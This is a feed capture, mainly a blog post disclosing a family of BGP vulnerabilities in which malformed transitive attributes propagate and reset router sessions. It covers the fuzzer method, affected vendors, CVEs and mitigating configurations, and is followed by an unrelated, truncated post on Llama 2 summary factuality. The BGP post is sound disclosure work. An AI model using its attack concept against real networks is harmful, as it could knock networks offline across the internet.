<p><img src="https://blog.benjojo.co.uk/asset/ipvnQ92fc1" alt="A broken fuse"></p>
<p>Border Gateway Protocol is the de facto protocol that directs routing decisions between different ISP networks, and is generally known as the “glue” that holds the internet together. It’s safe to say that the internet we currently know would not function without working BGP implementations.</p>
<p>However, the software on those networks’ routers (I will refer to these as edge devices from now on) that implements BGP has not had a flawless track record. Flaws and problems do exist in commercial and open source implementations of the world’s most critical routing protocol.</p>
<p>Most of these flaws are of course benign in the grand scheme of things; they will be issues around things like route filtering, or insertion, or <a href="https://blog.benjojo.co.uk/post/bgp-stuck-routes-tcp-zero-window">handling withdraws</a>. However a much more scary issue is a BGP bug that can propagate after causing bad behaviour, akin to a <a href="https://en.wikipedia.org/wiki/Computer_worm">computer worm</a>.</p>
<p>While debugging support for a future feature for my business (bgp.tools) I took a brief diversion to investigate something, and what I came out with might be one of the most concerning things I’ve discovered for the reliability of the internet. To understand the problems, though, we will need a bit more context.</p>
<h2>A mistaken attribute</h2>
<p>On 2 June 2023, a <a href="https://bgp.tools/as/264366">small Brazilian network</a> (re)announced one of their internet routes with a small bit of information called an attribute that was corrupted. The information on this route was for a feature that had not finished standardisation, but was set up in such a way that if an intermediate router did not understand it, then the intermediate router would pass it on unchanged.</p>
<p>As many routers did not understand this attribute, this was no problem for them. They just took the information and propagated it along. However it turned out that Juniper routers running even slightly modern software did understand this attribute, and since the attribute was corrupted the software in its default configuration would respond by raising an error that would shut down the whole BGP session. Since a BGP session is often a critical part of being “connected” to the wider internet, this resulted in the small Brazilian network disrupting other networks’ ability to communicate with the rest of the internet, despite being 1000’s of miles away.</p>
<p>The packet that causes session shutdowns was really quite benign at first glance:</p>
<p><img src="https://blog.benjojo.co.uk/asset/7CcFultij0" alt="A screenshot of wireshark"></p>
<p>When a BGP session shuts down due to errors, customer network traffic generally stops flowing down that cable until the BGP connection is automatically restarted (typically within seconds to minutes).</p>
<p>This appears to be what happened to a number of different carriers, for example <a href="https://bgp.tools/as/8220">COLT</a> was heavily impacted by this. Their outage is what originally drew some of my attention to this subject area.</p>
<p>To understand why this sort of thing can happen, we’ll need to take a deeper look at what BGP route attributes are, and what they’re used for.</p>
<h2>What is a BGP Route Attribute?</h2>
<p>At their core a BGP UPDATEs purpose is to tell another router about some traffic that it can (or can no longer) send to it. However just knowing directly what you can send to another router is not very useful without <em>context</em>.</p>
<p>For this reason a BGP packet is split up into two sections: the Network Layer Reachability Information (NLRI) data (aka, the IP address ranges), and the attributes that help describe extra context about that reachability data.</p>
<p>Arguably the most used attribute is the AS_PATH (or actually, the AS4_PATH), an attribute that tells you which networks a route has travelled through to get to you. Routers use this list of networks to pick paths for their traffic that are either the fastest, economically viable, or least congested, playing a critical role in ensuring that things run smoothly.</p>
<p>At the time of writing there are over 32 different route attribute types, 14 deprecated ones, and 209 officially unassigned ones. The Internet Assigned Numbers Authority (IANA) is in charge of <a href="https://www.iana.org/assignments/bgp-parameters/bgp-parameters.xhtml#bgp-parameters-2">assigning codes to each BGP attribute type codes</a>, normally off the back of IETF Internet-Drafts. The IANA list doesn’t always give the full story, though, as not all internet-drafts make their way into more official documents (like RFC’s), so code numbers are assigned (or sometimes even “squatted”) to attribute types that did not get wide deployment.</p>
<h2>Unknown attribute propagation</h2>
<p>At the start of every route attribute is a set of flags, conveying information about the attribute. One important flag is called the “transitive bit”:</p>
<p><img src="https://blog.benjojo.co.uk/asset/BSaiOklQh0" alt="A wireshark decoding of the BGP Path Attribuites Flags"></p>
<p>If a BGP implementation does not understand an attribute, and the transitive bit is set, it will copy it to another router. If the router does understand the attribute then it may apply its own policy.</p>
<p>At a glance this “feature” seems like an incredibly bad idea, as it allows possibly unknown information to propagate blindly through systems that do not understand the impact of what they are forwarding. However this feature has also allowed widespread deployment of things like <a href="https://datatracker.ietf.org/doc/html/rfc8195">Large Communities</a> to happen faster, and has arguably made deployment of new BGP features possible at all.</p>
<h2>When attribute decoding goes wrong</h2>
<p>What happens when an attribute fails to decode? The answer depends strongly on if the BGP implementation has been updated to use <a href="https://datatracker.ietf.org/doc/html/rfc7606">RFC 7606</a> logic or not; If the session is <em>not</em> <a href="https://datatracker.ietf.org/doc/html/rfc7606">RFC 7606</a> compliant, then typically an error is raised and the session is shut down. If it is, the session can usually continue as normal (except the routes impacted by the decoding error are treated as unreachable).</p>
<p>BGP session shutdowns are particularly undesirable, as they will impact traffic flow along a path. However in the case of a “Transitive” error they can become worm-like. Since not all BGP implementations support the same attributes, an attribute that is unknown to one implementation (and subsequently forwarded along) can cause another implementation to shut down the session it received it from.</p>
<p>With some reasonably educated crafting of a payload, someone could design a BGP UPDATE that “travels” along the internet unharmed, until it reaches a targeted vendor and results in that vendor resetting sessions. If that data comes down the BGP connections that are providing wider internet access for the network, this could result in a network being pulled offline from the internet.</p>
<p><img src="https://blog.benjojo.co.uk/asset/vQvI0ZQC9V" alt=""></p>
<p>This attack is not even a one-off “hit-and-run”, as the “bad” route is still stored in the peer router; when the session restarts the victim router will reset again the moment the route with the crafted payload is transmitted again. This has the potential to cause prolonged internet or peering outages.</p>
<p>This is a large part of why the RFC mentioned earlier, RFC 7606, exists; looking at its security considerations section, we can see a description of this exact problem::</p>
<blockquote>
<p>Security Considerations
This specification addresses the vulnerability of a BGP speaker to a
potential attack whereby a distant attacker can generate a malformed
optional transitive attribute that is not recognized by intervening
routers. Since the intervening routers do not recognize the
attribute, they propagate it without checking it. When the malformed
attribute arrives at a router that does recognize the given attribute
type, that router resets the session over which it arrived. Since
significant fan-out can occur between the attacker and the routers
that do recognize the attribute type, this attack could potentially
be particularly harmful.</p>
</blockquote>
<p>In a basic BGP setup this is bad, but with extra engineering it could be used to partition large sections of the internet. If BGP sessions between carriers are forced to reset in this way, causing traffic flow to stop, some routes on the internet would not have alternatives to use, making this a family of bugs that is a grave threat to the overall reliability of the internet.</p>
<h2>Building a basic fuzzer</h2>
<div>
<p><b>Important Commitment:</b> I run a business that involves being peered to many IXP route servers and other peoples routers. I have not and will not ever test for BGP bugs/exploits on customer/partner sessions (unless they give consent).</p>
<p>All testing here has been done either on <a href="https://www.gns3.com/">GNS3</a> VMs, or physical hardware I have hanging around and in isolated VLANs.</p>
</div>
<p>To figure out if this would be a practically exploitable attack, I decided to write a <a href="https://en.wikipedia.org/wiki/Fuzzing">fuzzer</a> that would try to stuff random data in random attribute codes to see if I could get sessions to reset on different vendors BGP implementations.</p>
<p>Because I am looking for problems that are “wormable”, I added a <a href="https://bird.network.cz/">Bird 2</a> router in between my fuzzer and the router being tested. This way Bird will filter out all of the obvious non-exploitable issues, and leave me with the packets that are of concern.</p>
<p><img src="https://blog.benjojo.co.uk/asset/ppvsN8rslG" alt=""></p>
<p>All good fuzzers should be able to run unattended, so how do we teach the fuzzer to tell if the session has reset itself? The solution I came to was that the Victim router would always announce a keepalive prefix, 192.0.2.0/24 (aka <a href="https://www.rfc-editor.org/rfc/rfc5735"><code>TEST-NET-1</code></a>) and the fuzzer would treat a withdraw of that prefix (from the intermediate bird router) as a sign the session went down, and report back the parameters that caused that to happen!</p>
<p>Testing the fuzzer, I can see that the bird output shows unknown attributes as their type code, and a hex encoding of their contents. In addition it puts a <code>[t]</code> to indicate that it is transitive.</p>
<pre><code>198.51.100.0/24      unicast [fuzzer 21:31:24.378] * (100) [AS65001?]
	via 192.168.5.1 on ens5
	Type: BGP univ
	BGP.origin: Incomplete
	BGP.as_path: 65001
	BGP.next_hop: 192.168.5.1
	BGP.local_pref: 100
	BGP.community: (123,2345)
	BGP.ec [t]: 7d cc c7 30
</code></pre>
<p>Now that the fuzzer was able to run itself, all that was left was to test all of the vendors one by one…</p>
<h2>Fuzzer findings / Impacted Vendors</h2>
<p>Keep in mind that the described issues are applicable if you are running an edge device with full BGP tables. If you are not running a “full routing table” or a partial peering table, then you are less likely to be impacted by these discoveries.</p>
<p>Another thing to keep in mind, the issues below are different to the ones that <a href="https://www.blackhat.com/us-23/briefings/schedule/index.html#route-to-bugs-analyzing-the-security-of-bgp-message-parsing-32162">the team at Forescout recently presented at BlackHat</a>.</p>
<p>Unimpacted Vendors:</p>
<ul>
<li>MikroTik RouterOS 7+</li>
<li>Ubiquiti EdgeOS</li>
<li>Arista EOS</li>
<li>Huawei NE40</li>
<li>Cisco IOS-XE / “Classic” / XR</li>
<li>Bird 1.6, All versions of Bird 2.0</li>
</ul>
<h2>Juniper JunOS Impact</h2>
<p>Similar to the problem that caused this research to be done, another exploitable Attribute was found in the form of Attribute 29 (BGP-LS). Due to the nature of the attribute it is unlikely that an exploit attempt will propagate too far over the internet, however peering sessions and route servers are still at risk.</p>
<p>All Juniper users are <strong>urged</strong> to enable <code>bgp-error-tolerance</code>:</p>
<pre><code>[edit protocols bgp]
root# show 
group TRANSIT {
    import import-pol;
    export send-direct;
    peer-as 4200000001;
    local-as 4200000002;
    neighbor 192.0.2.2;
}
bgp-error-tolerance;
</code></pre>
<p>In all tested cases, enabling bgp-error-tolerance does not reset sessions, and applies the improved behaviour without restarting sessions.</p>
<p>A JunOS software release is expected in the future to correct this. One member of staff at Juniper has also <a href="https://datatracker.ietf.org/doc/html/draft-haas-idr-bgp-attribute-escape-00">authored an Internet-Draft at the IETF</a> around handling these issues. Juniper is tracking this issue as CVE-2023-4481.</p>
<h2>Nokia SR-OS Impact</h2>
<p>Fuzzing SR-OS (Version 22.10) revealed many, likely highly propagatable and thus exploitable attributes.</p>
<p>All Nokia SR-OS and SR-Linux users are <strong>urged</strong> to enable <code>error-handling update-fault-tolerance</code> on their devices.</p>
<pre><code> bgp
     group "TRANSIT"              
         export "yes"
         error-handling
             update-fault-tolerance
         exit
         neighbor 192.0.2.2
             peer-as 2
         exit
     exit
     no shutdown
 exit
</code></pre>
<p>In all tested cases, enabling update-fault-tolerance does not reset sessions, and applies the improved behaviour without restarting sessions.</p>
<p>To the best of my understanding, Nokia has no plans to correct these issues, instead suggesting customers apply <code>error-handling update-fault-tolerance</code> to their BGP groups.</p>
<h2>FRR Impact (and other downstream vendors)</h2>
<p><a href="https://github.com/FRRouting/frr">FRR</a> attempts to handle bad attributes using RFC 7606 behaviour. However the fuzzer discovered that a corrupted attribute 23 (Tunnel Encapsulation) will cause a session to go down regardless.</p>
<p>After reporting this bug to FRR maintainers I received an acknowledgement of the issue and understanding that the issue is a DoS risk to FRR users, but I have not managed to get anything out of FRR since.</p>
<p>This bug is being tracked as CVE-2023-38802 and at the time of writing has no patch or fix.</p>
<p>FRR is packaged inside many other products, to name a few: <a href="https://en.wikipedia.org/wiki/SONiC_(operating_system)">SONIC</a>, <a href="https://www.pica8.com/">PICA8</a>, <a href="https://www.nvidia.com/en-gb/networking/ethernet-switching/cumulus-linux/">Cumulus</a>, and <a href="https://www.danosproject.org/">DANOS</a>.</p>
<h2>OpenBSD OpenBGPd Impact</h2>
<p>OpenBGPd also supports the improved RFC 7606 behaviour, however it was found that the recently added <a href="https://www.rfc-editor.org/rfc/rfc9234.html">Only To Customer</a> implementation could cause session resets. This issue was very rapidly fixed after being reported to them, and is tracked as CVE-2023-38283.</p>
<p>OpenBSD users can install <a href="https://www.openbsd.org/errata73.html">Eratta 006</a> to mitigate this issue.</p>
<h2>Extreme Networks EXOS Impact</h2>
<p>As a result of fuzzing EXOS, the program revealed 2 highly propagatable and thus exploitable attributes in the form of:</p>
<ul>
<li>Attribute 21: AS_PATHLIMIT</li>
<li>Attribute 25: IPv6 Address Specific Extended Community</li>
</ul>
<p>There is currently no known patch or mitigating config for this issue.</p>
<p>I made Extreme aware of this problem, however after a back and forth with them waiting for what I understood was an implied release of a patch or fix, they communicated that they will not be fixing it in the near future.</p>
<p>A quote from the security email thread (I’ve added emphasis to the critical parts of their response):</p>
<blockquote>
<p>After review of all the material, <strong>we are not considering this a vulnerability due to the presence of RFC 7606</strong>, as well as a history of documentation expressing these concerns all the way back to early 2000s, if not earlier. Malformed attributes are not a novel concept as an attack vector to BGP networks, as evidenced by RFC 7606, which is almost a decade old.
As such, customers that have chosen to not require or implement RFC 7606 have done so willingly and with knowledge of what is needed to defend against these types of attacks. Thus, the expectation that we’ll reset our BGP sessions based on RFC 4271 attribute handling is proper. We do abide by other RFCs, in which we claim support, that update RFC 4271.
Other vendors do claim RFC 7606 support and have been sharing these controls as a mitigation to malformed attribute response. They don’t appear to be producing new work product to account for these behaviors.
<strong>We are evaluating support for RFC 7606 as a future feature.</strong> Obviously, if customers desire a different response, we’ll work through our normal feature request pipelines to address. This is no different than any other RFC support request.</p>
</blockquote>
<p>I cannot overstate how much I disagree with Extreme’s response to this, and in the interests of full transparency (and to avoid any allegations of editorialising this, in my view, extremely poor response), I have made the full email exchange available here: <a href="https://blog.benjojo.co.uk/asset/JgH8G5duO1">(PDF)</a>.</p>
<h2>The Vendor Security Response</h2>
<p>I’ve been through my fair share of security issue discoveries, and over time I’ve taken a stronger leaning into “simply do not report” or “full disclosure without warning”, rather than the now commonly accepted 90 day “responsible disclosure” methodology. This is mostly because I’ve had really poor experiences when disclosing issues to security teams.</p>
<p>The bugs discussed in this post cover many vendors and implementations. Full disclosure was originally my plan, however due to the clear risk of harm to the general internet routing system from these findings, I felt it was likely inexcusable to do full-disclosure. (Plus, a malicious deployment of these findings could have a small but I believe very real chance of a <a href="https://en.wikipedia.org/wiki/Kinetic_military_action">“kinetic response”</a> from a misunderstanding.)</p>
<p>Overall the response from vendors has been mostly disappointing. One vendor was extremely hard to find contacts for, and I feel that they were stringing me along for some time, only to reply back that they were not going to fix the problem.</p>
<p>Other vendors notably were not immediately interested in notifying customers of mitigating config to the problems, however when I personally started extending notices to my peers at larger carriers about the problems (since if they were not going to, I was going to try and reduce the exploit surface) a vendor notice was issued.</p>
<p>No vendor that I reported to has any form of bug bounty, and this entire adventure has consumed huge volumes of my time and mental capacity. In a normal situation this “cost” would have simply been eaten by an employer whose interest is name recognition or altruistic actions. However I am self-employed with my own company (that admittedly does have an interest in a functioning BGP ecosystem), and so this entire adventure has simply delayed product development that I (and customers) really would have liked to have done.</p>
<p>With all of that in mind, my “good faith” advice to people reporting security bugs in network vendor software is that contacting vendors is not an effective solution.</p>
<p>The people on the other side are either already overloaded, or generally don’t care about receiving issues. Since there is no motivation to report bugs (either in the form of bug bounties, or being treated well), I see no reason to do responsible disclosure (apart from cases where it would clearly protect their innocent customers from misery, while accounting for the risk of a vendor simply doing nothing).</p>
<p>The two options, as far as I see it, are either being strung along by a vendor over email for 90 days and then likely finding out nothing is done, or full disclosure.</p>
<p>I worry about the state of networking vendors.</p>
<p>With that being said, I would like to thank the OpenBSD security team, who very rapidly acknowledged my report, and prepared a patch. My only regret with dealing with the OpenBSD team was reporting the issue to them too quickly, as they are uninterested in waiting for any kind of coordination in disclosure.</p>
<h2>Closing thoughts</h2>
<p>As mentioned before, with a few of the vendors (Nokia, Extreme, Juniper) I found myself contacting their own customers myself to warn them to enable mitigating config, as that proved to be a much more effective way at preventing risk than trying to push the vendor itself into action.</p>
<p>As a result at least several incumbent ISPs, 1 large CDN, and 2 “Tier 1” networks have applied configuration to help prevent these issues from impacting them.</p>
<p>If the goal of reporting security flaws is to reduce harm to their customers, I’m not convinced that reporting problems to vendors has enough of an effective impact to be worth doing, vs the loss of personal time and sanity.</p>
<p>Several people I spoke to have been incredibly helpful (some who could not be listed here). I would like to thank the following people for having some role in helping me either discover/disclose these problems, editing this post, or general support for when vendors were being very frustrating.</p>
<ul>
<li>Basil Fillan</li>
<li>Alistair Mackenzie</li>
<li>Will Hargrave</li>
<li>Filippo Valsorda</li>
<li>Joseph Lorenzo Hall</li>
<li>Job Snijders</li>
<li>eta</li>
</ul>
<hr>
<p>If you want to stay up to date with the blog you can use the <a href="https://blog.benjojo.co.uk/rss.xml">RSS feed</a> or you can follow me on Mastodon/Fediverse <a href="https://benjojo.co.uk/u/benjojo">@benjojo@benjojo.co.uk</a></p>
<p>If you run a network and are interested in BGP monitoring do check out <a href="https://bgp.tools/">bgp.tools</a>! Otherwise if you like what I do or think that you could do with some of my bizarre areas of knowledge I am also open for contract work, please contact me over at workwith@benjojo.co.uk!</p>
<p>Until next time!</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Llama 2 is about as factually accurate as GPT-4 for summaries and is 30X cheaper (106 pts)]]></title>
            <link>https://www.anyscale.com/blog/llama-2-is-about-as-factually-accurate-as-gpt-4-for-summaries-and-is-30x-cheaper</link>
            <guid>37305383</guid>
            <pubDate>Tue, 29 Aug 2023 09:55:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anyscale.com/blog/llama-2-is-about-as-factually-accurate-as-gpt-4-for-summaries-and-is-30x-cheaper">https://www.anyscale.com/blog/llama-2-is-about-as-factually-accurate-as-gpt-4-for-summaries-and-is-30x-cheaper</a>, See on <a href="https://news.ycombinator.com/item?id=37305383">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2>Why should I read this?</h2><ul><li><p>Summarizing is one of the most practical applications of LLM, but you need to know you can trust your summary to be factually accurate.</p></li><li><p>You may be interested in using open source LLMs like Llama 2 for summarization (for cost or data access reasons) but are unsure about its factual accuracy.</p></li><li><p>In this experiment, we found <code>Llama-2-70b</code> is almost as strong at factuality as <code>gpt-4</code>, and considerably better than <code>gpt-3.5-turbo</code>.</p></li></ul><h3><b>What we did:&nbsp;</b></h3><ul><li><p>We used <a href="https://app.endpoints.anyscale.com/" target="_blank" rel="noopener"><u>Anyscale Endpoints</u></a> to compare Llama 2 7b, 13b and 70b (<code>chat-hf</code> fine-tuned) vs OpenAI <code>gpt-3.5-turbo</code> and <code>gpt-4</code>.&nbsp;We used a 3-way verified hand-labeled set of 373 news report statements and presented one correct and one incorrect summary of each. Each LLM had to decide which statement was the factually correct summary.&nbsp; </p></li></ul><h3><b>What we found:&nbsp;</b></h3><ul><li><p>We encountered two practical problems:</p><ul><li><p>Not following instructions. Bigger models were better at following instructions. We had to use another LLM to understand the outputs of the smaller LLMs and work out if it said A or B was the answer. </p></li><li><p>Ordering bias. Given A and B, are you more likely to suggest A simply because it is first? One way to test this is to swap the ordering and see how many times you say A both times or B both times. </p></li></ul></li><li><p>Once we dealt with these problem we saw:&nbsp;</p><ul><li><p><b>Human:</b> 84% (from <a href="https://aclanthology.org/P19-1213/" target="_blank" rel="noopener">past research)</a>&nbsp;</p></li><li><p><code><b>gpt-3.5-turbo</b></code><b>:</b> 67.0% correct (seemed to have severe ordering bias issues)</p></li><li><p><code><b>gpt-4</b></code><b>:</b> 85.5% correct&nbsp;</p></li><li><p><code><b>Llama-2-7b</b></code><b>:</b> Catastrophic ordering bias failure. Less than random accuracy</p></li><li><p><code><b>Llama-2-13b</b></code><b>:</b> 58.9% correct</p></li><li><p><code><b>Llama-2-70b</b></code><b>:</b> 81.7%&nbsp;</p></li></ul></li><li><p>This means we should use <code>Llama-2-70b</code> or <code>gpt-4</code> to increase the chances of a factual summarization (in the same ballpark as humans). <code>gpt-4</code> was slightly better than human, <code>Llama-2-70b</code> slightly worse. </p></li><li><p><code>Llama-2-7b</code> and <code>Llama-2-13b</code> had issues following the task instructions; but we used another LLM to interpret their output. They had ordering bias issues. </p></li><li><p>Probably best not to use smaller Llamas or <code>gpt-3.5-turbo</code>.</p></li><li><p>We also noticed a few other patterns:&nbsp;</p><ul><li><p><code>gpt-4</code> and <code>gpt-3.5</code> are better at following instructions than their open source counterparts.&nbsp;</p></li><li><p><code>gpt-3.5</code> had pretty severe ordering bias issues.&nbsp;</p></li></ul></li><li><p>We also ran cost comparisons for the summarization and found:&nbsp;</p><ul><li><p>Llama 2 tokenization is longer than ChatGPT tokenization by 19% and this needs to be taken into account for cost.&nbsp;</p></li><li><p>Despite this, Llama 2 is 30 times cheaper for GPT-4 for equivalent levels of factuality in summarization </p></li></ul></li></ul><h3><b>How we did it:&nbsp;</b></h3><ul><li><p>We used <a href="https://app.endpoints.anyscale.com/" target="_blank" rel="noopener"><u>Anyscale Endpoints</u></a> (<a href="https://www.anyscale.com/blog/anyscale-endpoints-fast-and-scalable-llm-apis"><u>blog</u></a>) to do our evaluations quickly.&nbsp;&nbsp;</p></li><li><p>We also show how using Pandas + Ray (especially Ray Data) together makes running these experiments super easy. The entire experiment above can be done in about 30 lines and 15 minutes.</p></li><li><p>IPython notebook <a href="https://github.com/anyscale/factuality-eval" target="_blank" rel="noopener"><u>here</u></a>.&nbsp;</p></li></ul><h3><b>Contributions</b>:</h3><ul><li><p>We suggest a way of measuring pairwise ordering bias, and a way to remedy it (order swapping).&nbsp;</p></li></ul><h3><b>Tips:&nbsp;</b></h3><ul><li><p>When asking LLMs to select between options, beware of ordering bias.</p></li><li><p>Anyscale Endpoints rocks. Serverless Llama 2 makes experimentation so much easier.</p></li><li><p>Pandas is actually pretty good for LLM experiments.</p></li><li><p>Using Ray can accelerate running of experiments. </p></li></ul><h3><b>Great! Where’s the source?&nbsp;</b></h3><ul><li><p>Check out the <a href="https://github.com/anyscale/factuality-eval" target="_blank" rel="noopener">Notebooks</a>.&nbsp;</p></li></ul><h2>Details</h2><p>Summarization is one of the top immediate practical applications of LLMs (the other ones in our experience so far being retrieval augmented generation, talking to your data and long-document question answering).&nbsp;</p><p>One of the biggest challenges with summarization, however, is factuality: does the summary reflect accurately what the original document said? There are other characteristics, such as fluency and relevance that are also important, but LLMs are actually pretty good at both of those. Factuality (or its evil twin: hallucination) on the other hand is a known issue with LLMs. And it’s no use being fluent if you’re wrong.&nbsp;</p><p>Simultaneously, one question that is on everyone’s mind is: how do open-use LLMs like Llama 2 compare with established closed products like OpenAI <code>gpt-3.5-turbo</code> and <code>gpt-4</code>?</p><h2>The Literature</h2><p>Recent literature on summaries and summary evaluation has shown one consistent pattern: LLMs are really good at summarization based on human evaluation, and leave the previous generation of carefully engineered summarization systems behind. Primarily, however, these evals have focused on <code>gpt-3</code> or <code>gpt-3.5-turbo</code> and this has not been applied to open source LLMs; nor were they done with <code>gpt-4</code>.&nbsp;</p><div><p>One of the most challenging aspects of summarizing well turns out to be factuality: is the summary that is given faithful and consistent with the article it was based on? There’s been a lot of research on factuality. In particular, this </p><a href="https://aclanthology.org/P19-1213/" target="_blank" rel="noopener"><u>paper</u></a><p> discussed an interesting methodology for evaluating factuality: What if you asked an LLM to rank which answer was more factually consistent. They also included an interesting data set with </p><a href="https://tudatalib.ulb.tu-darmstadt.de/handle/tudatalib/2002" target="_blank" rel="noopener"><u>373 news sentences</u></a><p> sentences and two summary sentences, an incorrect one and a correct one. For example, it would have a situation like this one.</p><p><code>insiders say the row brought simmering tensions between the starkly contrasting pair -- both rivals for miliband's ear -- to a head.</code></p></div><p>And now consider A and B</p><p>A: <code>insiders say the row brought tensions between the contrasting pair.</code><br>B: <code>insiders say the row brought simmering tensions between miliband's ear.</code></p><p>Clearly the second one is inconsistent – the tension is between the two contenders, not within Miliband’s ear.&nbsp;</p><h2>A practical experiment</h2><p>Clearly these type of factual errors being present in a summary would be detrimental. So, how do we decide which LLMs are better at deciding which statements are factual and which are not? It is not too much of a stretch to conclude that a system that is better at telling factual from non-factual sentences is better at not making them up in the first place – or alternatively could decide through a two stage process if it was being inconsistent.&nbsp;</p><p>So, how can we evaluate these options? Let’s say we have 5 LLMs we want to test: Llama 2’s 3 different sizes, <code>gpt-3.5-turbo</code> and <code>gpt-4</code>. How can we run this eval? In total we have almost 2000 queries to make.&nbsp;</p><p>Answer: Ray to the rescue. Ray makes it very easy to parallelize queries like this. In practice, the biggest problem running this experiment was the stringent rate limiting on OpenAI’s <code>gpt-4</code> (and even <code>gpt-3.5-turbo</code>). Anyscale Endpoints was far more accommodating in this regard. </p><p>We can write two nested ray tasks as follows:&nbsp;</p><div><pre><code><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span><span>9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span><span>25
</span><span>26
</span><span>27
</span><span>28
</span><span>29
</span><span>30
</span><span>31
</span><span>32
</span><span>33
</span><span>34
</span><span>35
</span><span>36
</span><span>37
</span><span>38
</span><span>39
</span><span>40
</span><span>41
</span><span>42
</span><span>43
</span><span>44
</span><span>45
</span><span>46
</span></code><span><span># Read the eval dataset using Pandas</span><span>
</span></span><span>
</span><span><span>df = pd.read_json(</span><span>'resources/evals/val_sentence_pairs.json'</span><span>)
</span></span><span>
</span><span><span></span><span>def</span><span> </span><span>query_model</span><span>(</span><span>model_name, row, prompt_mgr,</span><span>):</span><span>
</span></span><span>
</span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;prompt = prompt_mgr.bind(</span><span>'consistent'</span><span>).render(
</span></span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;article_sent=row[</span><span>'article_sent'</span><span>],&nbsp;
</span></span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;option_a=row[</span><span>'correct_sent'</span><span>],
</span></span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;option_b=row[</span><span>'incorrect_sent'</span><span>])
</span></span><span>
</span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;system_prompt = prompt_mgr.bind(</span><span>'system'</span><span>).render()
</span></span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> model_name.startswith(</span><span>'openai://'</span><span>):&nbsp;
</span></span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;model_name = model_name.replace(</span><span>'openai://'</span><span>,</span><span>''</span><span>)
</span></span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;model = ChatOpenAI(model_name=model_name,&nbsp;
</span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;openai_api_key = oai_key, temperature = </span><span>0</span><span>)
</span></span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>else</span><span>:&nbsp;
</span></span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;model = ChatAnyscale(model_name=model_name,&nbsp;
</span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;anyscale_api_key = ae_key, temperature = </span><span>0</span><span>)
</span></span><span>
</span><span>&nbsp;&nbsp;&nbsp;&nbsp;messages = [SystemMessage(content=system_prompt),
</span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HumanMessage(content=prompt)]
</span><span>&nbsp;&nbsp;&nbsp;&nbsp;output = model(messages)
</span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>return</span><span> {</span><span>'output'</span><span>: output.content }
</span></span><span>
</span><span><span></span><span># Now partition into lots of small datasets for parallel processing</span><span>
</span></span><span><span>num_shards = </span><span>50</span><span>&nbsp;
</span></span><span><span></span><span># Reasonable number. We could split more finely if we wanted to.&nbsp;</span><span>
</span></span><span><span>num_cpus = </span><span>0.1</span><span> </span><span># A guess at the overhead of making these calls concurrently.&nbsp;</span><span>
</span></span><span><span>ds_by_model = [</span><span>None</span><span>] * </span><span>len</span><span>(models_to_test)*</span><span>2</span><span>
</span></span><span><span></span><span>for</span><span> i </span><span>in</span><span> </span><span>range</span><span>(</span><span>len</span><span>(models_to_test)):&nbsp;
</span></span><span>&nbsp;&nbsp;&nbsp;&nbsp;ds = ray.data.from_pandas(df).repartition(num_shards)
</span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;ds_by_model[i]= ds.</span><span>map</span><span>(</span><span>lambda</span><span> x: query_model(models_to_test[i], x, pm), num_cpus=</span><span>0.1</span><span>)
</span></span><span>
</span><span><span></span><span># and now pull it together.&nbsp;</span><span>
</span></span><span>
</span><span><span></span><span>@ray.remote</span><span>
</span></span><span><span></span><span>def</span><span> </span><span>convert_to_pandas</span><span>(</span><span>ds</span><span>):</span><span>
</span></span><span><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>return</span><span> ds.to_pandas()
</span></span><span>st = time.time()&nbsp;
</span><span><span>futures = [convert_to_pandas.remote(ds) </span><span>for</span><span> ds </span><span>in</span><span> ds_by_model]
</span></span><span>
</span><span>results = ray.get(futures)&nbsp;
</span><span>et = time.time()
</span><span><span></span><span>print</span><span>(</span><span>'Gathering results took {et-st} wall clock seconds.'</span><span>)
</span></span><span><span></span><span># Typical time is about 700 seconds on a g5.12xlarge&nbsp;</span><span>
</span></span><span>
